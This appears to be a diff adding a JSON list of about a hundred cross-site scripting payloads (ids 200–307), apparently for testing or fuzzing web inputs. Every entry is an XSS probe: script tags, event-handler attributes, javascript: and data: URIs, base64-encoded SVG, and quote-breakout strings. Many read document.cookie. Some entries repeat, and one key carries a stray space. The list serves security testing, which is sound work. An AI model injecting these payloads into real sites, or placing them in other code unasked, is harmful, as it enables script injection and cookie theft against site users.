@@ -1,0 +1,434 @@
+[
+    {
+        "id": 200,
+        "payload": "<script>alert(document.cookie)</script>"
+    },
+    {
+        "id": 201,
+        "payload": "<img src='x' onerror='alert(document.cookie)'>"
+    },
+    {
+        "id": 202,
+        "payload": "<svg/onload=alert(document.domain)>"
+    },
+    {
+        "id": 203,
+        "payload": "\";alert(document.cookie);//"
+    },
+    {
+        "id": 204,
+        "payload": "');alert(document.cookie)//"
+    },
+    {
+        "id": 205,
+        "payload": "' onfocus='alert(document.cookie)' autofocus='true'"
+    },
+    {
+        "id": 206,
+        "payload": "<input type='text' value='<script>alert(1)</script>'>"
+    },
+    {
+        "id": 207,
+        "payload": "<textarea><script>alert(1)</script></textarea>"
+    },
+    {
+        "id": 208,
+        "payload": "<div><img src=x onerror=alert(1)></div>"
+    },
+    {
+        "id": 209,
+        "payload": "<form><button type='button' onclick='alert(1)'>Click Me</button></form>"
+    },
+    {
+        "id": 210,
+        "payload": "'>><script>alert(1)</script>"
+    },
+    {
+        "id": 211,
+        "payload": "<marquee onstart=alert(1)>"
+    },
+    {
+        "id": 212,
+        "payload": "<img src=x onerror=alert(document.cookie)>"
+    },
+    {
+        "id": 213,
+        "payload": "'>><svg/onload=alert(document.cookie)>"
+    },
+    {
+        "id": 214,
+        "payload": "<iframe src=javascript:alert(1)>"
+    },
+    {
+        "id": 215,
+        "payload": "<object data=javascript:alert(1)>"
+    },
+    {
+        "id": 216,
+        "payload": "<svg/onload=alert(document.cookie)>"
+    },
+    {
+        "id": 217,
+        "payload": "<b onmouseover=alert(1)>Hover me</b>"
+    },
+    {
+        "id": 218,
+        "payload": "' onmouseover='alert(1)'"
+    },
+    {
+        "id": 219,
+        "payload": "<svg/onload=alert(1)>"
+    },
+    {
+        "id": 220,
+        "payload": "<input onfocus=alert(1)>"
+    },
+    {
+        "id": 221,
+        "payload": "<img src='x' onerror=alert(1)>"
+    },
+    {
+        "id": 222,
+        "payload": "<iframe src=javascript:alert(document.cookie)>"
+    },
+    {
+        "id": 223,
+        "payload": "<svg><script>alert(document.cookie)</script></svg>"
+    },
+    {
+        "id": 224,
+        "payload": "<input value=\"<script>alert(1)</script>\" />"
+    },
+    {
+        "id": 225,
+        "payload": "<button onclick=alert(1)>Click me</button>"
+    },
+    {
+        "id": 226,
+        "payload": "<img src=x onerror=alert(1)>"
+    },
+    {
+        "id": 227,
+        "payload": "<body onpageshow=alert(1)>"
+    },
+    {
+        "id": 228,
+        "payload": "' onmouseover=alert(document.cookie)//"
+    },
+    {
+        "id": 229,
+        "payload": "<div onmouseover=alert(1)>Hover me</div>"
+    },
+    {
+        "id": 230,
+        "payload": "<div><svg/onload=alert(document.cookie)></div>"
+    },
+    {
+        "id": 231,
+        "payload": "<img src=javascript:alert(document.cookie)>"
+    },
+    {
+        "id": 232,
+        "payload": "<input value=\"<svg/onload=alert(1)\">"
+    },
+    {
+        "id": 233,
+        "payload": "<textarea><script>alert(1)</script></textarea>"
+    },
+    {
+        "id": 234,
+        "payload": "<form><input value=\"<script>alert(1)\"></form>"
+    },
+    {
+        "id": 235,
+        "payload": "<textarea><svg/onload=alert(document.cookie)></textarea>"
+    },
+    {
+        "id": 236,
+        "payload": "<div onmouseover='alert(1)'>Hover here</div>"
+    },
+ {
+        "id": 237,
+        "payload": "<svg><script>alert(1)</script></svg>"
+    },
+    {
+        "id": 238,
+        "payload": "' onfocus='alert(document.domain)'"
+    },
+    {
+        "id": 239,
+        "payload": "'>><img src=x onerror=alert(1)>"
+    },
+    {
+        "id": 240,
+        "payload": "<textarea><script>alert(1)</script></textarea>"
+    },
+    {
+        "id": 241,
+        "payload": "<svg><script>alert(1)</script></svg>"
+    },
+    {
+        "id": 242,
+        "payload": "<input value='<script>alert(1)'></input>"
+    },
+    {
+        "id": 243,
+        "payload": "' onmouseover='alert(document.cookie)'"
+    },
+    {
+        "id": 244,
+        "payload": "' onmouseover='alert(1)'"
+    },
+    {
+        "id": 245,
+        "payload": "<form><button onclick='alert(1)'>Click me</button></form>"
+    },
+    {
+        "id": 246,
+        "payload": "<div><input type=text value='<script>alert(1)</script>'></div>"
+    },
+    {
+        "id": 247,
+        "payload": "<input type=button value='Click' onclick='alert(1)'>"
+    },
+    {
+        "id": 248,
+        "payload": "<svg><g onload=alert(1)></g></svg>"
+    },
+    {
+        "id": 249,
+        "payload": "<input onfocus=alert(1) autofocus>"
+    },
+    {
+        "id": 250,
+        "payload": "<button onclick=alert(document.cookie)>Click me</button>"
+    },
+    {
+        "id": 251,
+        "payload": "<input type='text' value=''><img src=x onerror=alert(1)>"
+    },
+    {
+        "id": 252,
+        "payload": "' onmouseover=alert(1) autofocus"
+    },
+    {
+        "id": 253,
+        "payload": "<img src=1 onerror=alert(document.cookie)>"
+    },
+    {
+        "id": 254,
+        "payload": "<iframe src='javascript:alert(document.cookie)'></iframe>"
+    },
+    {
+        "id": 255,
+        "payload": "<input type='hidden' value='<script>alert(1)</script>'>"
+    },
+    {
+        "id": 256,
+        "payload": "<object data=javascript:alert(1)>"
+    },
+    {
+        "id": 257,
+        "payload": "<embed src=javascript:alert(1)>"
+    },
+    {
+        "id": 258,
+        "payload": "<input type=text value=\"'><script>alert(1)</script>\">"
+    },
+    {
+        "id": 259,
+        "payload": "<input onmouseover='alert(1)'>"
+    },
+    {
+        "id": 260,
+        "payload": "<textarea onfocus='alert(1)' autofocus>"
+    },
+    {
+        "id": 261,
+        "payload": "<iframe src='data:text/html,<script>alert(1)</script>'>"
+    },
+    {
+        "id": 262,
+        "payload": "<object type='image/svg+xml' data='data:image/svg+xml,<svg><script>alert(1)</script></svg>'>"
+    },
+    {
+        "id": 263,
+        "payload": "<div contenteditable='true' oninput=alert(1)>"
+    },
+    {
+        "id": 264,
+        "payload": "<input value='<img src=x onerror=alert(1)>'>"
+    },
+    {
+        "id": 265,
+        "payload": "<img src='data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+'>"
+    },
+    {
+        "id": 266,
+        "payload": "<input type='text' onmouseover='alert(document.cookie)'>"
+    },
+    {
+        "id": 267,
+        "payload": "<div draggable='true' ondrag='alert(1)'>Drag me</div>"
+    },
+    {
+        "id": 268,
+        "payload": "<button ondblclick=alert(1)>Double Click</button>"
+    },
+    {
+        "id": 269,
+        "payload": "<input type='search' onsearch=alert(1)>"
+    },
+    {
+        "id": 270,
+        "payload": "<input type='tel' value='call me' onfocus=alert(1)>"
+    },
+    {
+        "id": 271,
+        "payload ": "<form action='javascript:alert(1)'><input type=submit value=Submit></form>"
+    },
+    {
+        "id": 272,
+        "payload": "<form action='#'><input type=text value='' onfocus=alert(1)></form>"
+    },
+    {
+        "id": 273,
+        "payload": "<svg><a xlink:href=javascript:alert(1)>Click</a></svg>"
+    },
+    {
+        "id": 274,
+        "payload": "<input type='range' oninput=alert(1)>"
+    },
+    {
+        "id": 275,
+        "payload": "<textarea onfocus=alert(1) autofocus>"
+    },
+    {
+        "id": 276,
+        "payload": "<img src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' onerror='alert(1)'>"
+    },
+    {
+        "id": 277,
+        "payload": "<div style='width:expression(alert(1))'>"
+    },
+    {
+        "id": 278,
+        "payload": "<input type='text' value='<svg/onload=alert(1)>'>"
+    },
+    {
+        "id": 279,
+        "payload": "<input type='text' onkeypress='alert(1)'>"
+    },
+    {
+        "id": 280,
+        "payload": "<input type='email' onfocus=alert(1)>"
+    },
+    {
+        "id": 281,
+        "payload": "<input type='url' onfocus=alert(1)>"
+    },
+    {
+        "id": 282,
+        "payload": "<input type='color' onfocus=alert(1)>"
+    },
+    {
+        "id": 283,
+        "payload": "<input type='datetime-local' onfocus=alert(1)>"
+    },
+    {
+        "id": 284,
+        "payload": "<input type='month' onfocus=alert(1)>"
+    },
+    {
+        "id": 285,
+        "payload": "<input type='number' onfocus=alert(1)>"
+    },
+    {
+        "id": 286,
+        "payload": "<input type='range' onfocus=alert(1)>"
+    },
+    {
+        "id": 287,
+        "payload": "<input type='search' onfocus=alert(1)>"
+    },
+    {
+        "id": 288,
+        "payload": "<input type='time' onfocus=alert(1)>"
+    },
+    {
+        "id": 289,
+        "payload": "<input type='week' onfocus=alert(1)>"
+    },
+    {
+        "id": 290,
+        "payload": "<input type='checkbox' onclick=alert(1)>"
+    },
+    {
+        "id": 291,
+        "payload": "<form action='javascript:alert(1)'><input type='submit'></form>"
+    },
+    {
+        "id": 292,
+        "payload": "<input type='password' onfocus=alert(1)>"
+    },
+    {
+        "id": 293,
+        "payload": "<form><input type='reset' value='Reset' onfocus=alert(1)></form>"
+    },
+    {
+        "id": 294,
+        "payload": "<input type='hidden' value='<script>alert(1)</script>'>"
+    },
+    {
+        "id": 295,
+        "payload": "<textarea><img src=x onerror=alert(1)></textarea>"
+    },
+    {
+        "id": 296,
+        "payload": "<textarea onfocus='alert(document.cookie)' autofocus>"
+    },
+    {
+        "id": 297,
+        "payload": "<div><iframe src='javascript:alert(1)'></iframe></div>"
+    },
+    {
+        "id": 298,
+        "payload": "<input type='text' value='' onclick='alert(1)'>"
+    },
+    {
+        "id": 299,
+        "payload": "<input onfocus=alert(1)>"
+    },
+    {
+        "id": 300,
+        "payload": "<input onblur=alert(1)>"
+    },
+    {
+        "id": 301,
+        "payload": "<div style='background:url(javascript:alert(1))'>"
+    },
+    {
+        "id": 302,
+        "payload": "<div style='background:url(data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)'>"
+    },
+    {
+        "id": 303,
+        "payload": "<iframe src='javascript:alert(1)'></iframe>"
+    },
+    {
+ "id": 304,
+        "payload": "<input type='radio' checked onclick=alert(1)>"
+    },
+    {
+        "id": 305,
+        "payload": "<form><input type='button' value='Click' onclick='alert(1)'></form>"
+    },
+    {
+        "id": 306,
+        "payload": "<input type='search' onfocus=alert(document.cookie)>"
+    },
+    {
+        "id": 307,
+        "payload": "<img src='x' onerror='alert(1)'>"
+    }
+]
